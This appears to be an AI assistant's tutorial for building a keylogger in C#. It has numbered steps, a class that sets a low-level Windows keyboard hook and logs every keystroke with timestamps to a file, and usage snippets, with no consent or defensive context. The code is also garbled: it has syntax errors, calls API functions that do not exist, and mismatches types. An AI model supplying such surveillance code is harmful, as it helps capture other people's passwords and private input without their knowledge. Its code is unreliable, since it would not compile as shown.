To create a keystroke-logging application in C# using the Win32 API, follow these steps:

### Step-by-Step Explanation:

1. **References and Setup:**
   - Include necessary namespaces: `System`, `System.Collections.Generic`, `System.Threading`, and `User32`.
   - Use the `using` directive for these namespaces to make their classes accessible.

2. **Define the Keystroke Logger Class:**
   - Create a class `KeystrokeLogger` to encapsulate the functionality.
   - Include private fields for the hook ID, a queue for storing keystrokes, and a file stream for logging.

3. **Set Up the Keyboard Hook:**
   - Use the `SetWindowsHookEx` function with `WH_KEYBOARD_LL` to set a low-level keyboard hook.
   - Define the `KeyDown` and `KeyUp` callback methods to handle key events.

4. **Capture Keystrokes:**
   - In the callback methods, check if the key is pressed or released.
   - For each key press, record the key character and the timestamp.

5. **Log Keystrokes:**
   - Use a `ConcurrentQueue` to buffer the keystrokes and ensure thread-safety.
   - Write the keystrokes to a file using a `StreamWriter`.

6. **Unhook and Cleanup:**
   - Use `UnhookEx` to remove the keyboard hook when done or when the program exits.
   - Ensure all resources are properly released to avoid leaks.

7. **Handle Errors and Configurations:**
   - Include error handling for `SetWindowsHookEx` and `UnhookEx`.
   - Optionally, allow configuration of the log file path and maximum log size.

### Sample Code:

```csharp
using System;
using System.Collections.Concurrent;
using System.IO;
using System.Threading;
using System.Windows.Input;
using User32;

public class KeystrokeLogger
{
    private readonly object _lock = new object();
    private int _hookId;
    private ConcurrentQueue<Keystroke> _queue;
    private StreamWriter _streamWriter;
    private string _logFileName;
    private int _maxLogSize = 1000;

    public KeystrokeLogger(string logFileName, int maxLogSize)
    {
        _logFileName = logFileName;
        _maxLogSize = maxLogSize;
        _queue = new ConcurrentQueue<Keystroke>();
        _streamWriter = new StreamWriter(logFileName, true);
        Initialize();
    }

    private void Initialize()
    {
        _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, KeyDownCallback, 0, 0);
        if (_hookId == 0)
        {
            throw new Exception("Failed to set keyboard hook.");
        }
    }

    public class Keystroke
    {
        public int Timestamp { get; set; }
        public Keys Key { get; set; }
        public char Character { get; set; }
    }

    private static int KeyDownCallback(int hkid, int wParam, int lParam)
    {
        if ((wParam != 0x0000) && (wParam & 0x01) != 0)
        {
            var key = (Keys)((wParam >> 0) | 0x0000);
            var keystroke = new Keystroke
            {
                Timestamp = DateTime.Now.ToString("HH:mm:ss.fff"),
                Key = key,
                Character = GetCharFromKey(key)
            };
            lock (_lock)
            {
                _queue.Enqueue(keystroke);
            }
        }
        return _hookId;
    }

    private static char GetCharFromKey(Keys key)
    {
        if (key == Keys.Backslash) return '\\';
        if (key == Keys.Minus) return '-';
        if (key == Keys.Comma) return(',');
        if (key == Keys period) return '.';
        if (key == KeysSlash) return '/';
        if (key == Keys.Enter) return '\n';
        return (char)key;
    }

    public void StartRecording()
    {
        new Thread(() =>
        {
            while (true)
            {
                lock (_lock)
                {
                    if (_queue.IsEmpty)
                        Thread.Sleep(100);
                    else
                    {
                        var stroke = _queue.Dequeue();
                        _streamWriter.WriteLine($"{stroke.Timestamp} - {stroke.Key} - {stroke.Character}");
                        if (_streamWriter.BaseStream.Position >= _streamWriter.BaseStream.Length)
                        {
                            _streamWriter.Flush();
                            if (_streamWriter.BaseStream.Length > _maxLogSize * 1024)
                            {
                                _streamWriter.SetLength(0);
                            }
                        }
                    }
                }
            }
        }).Start();
    }

    public void StopRecording()
    {
        UnhookEx(_hookId);
        _streamWriter.Dispose();
        _queue = null;
    }
}
```

### Usage:

1. **Instantiate the Logger:**
   ```csharp
   var logger = new KeystrokeLogger("KeystrokeLog.txt", 1000);
   ```

2. **Start Logging:**
   ```csharp
   logger.StartRecording();
   ```

3. **Stop Logging:**
   ```csharp
   logger.StopRecording();
   ```

